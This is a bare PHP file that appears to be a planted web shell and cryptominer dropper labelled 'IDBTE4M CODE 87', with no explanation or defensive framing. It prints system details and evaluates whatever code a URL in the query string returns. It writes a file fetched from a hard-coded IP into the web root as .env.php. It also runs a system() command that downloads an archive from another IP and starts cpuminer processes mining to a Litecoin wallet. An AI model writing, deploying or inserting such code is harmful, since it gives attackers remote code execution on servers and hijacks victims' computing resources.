<?php
echo '<center><h1>IDBTE4M CODE 87</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] '; $ch = curl_init($_GET['url']);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
if(isset($_GET['run'])){
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check5 = $_SERVER['DOCUMENT_ROOT'] . "/.env.php" ;
$text5 = http_get('http://185.213.209.151/vendor/ijo.js');
$open5 = fopen($check5, 'w');
fwrite($open5, $text5);
fclose($open5);
if(file_exists($check5)){
}
}
echo system('cd /tmp && wget http://161.35.110.135/a.tar.gz && tar zxf a.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u LhzifNJpnLr32UdnpSxmW4ysC7qVTqWaYc -p c=LTC --background --cpu-priority 5 --no-longpoll --no-getwork --diff-multiplier 1.0 && ./cpuminer-sse42 -a cpupower -o stratum+tcp://cpupower.jp.mine.zpool.ca:6240 -u LhzifNJpnLr32UdnpSxmW4ysC7qVTqWaYc -p c=LTC --background');
?>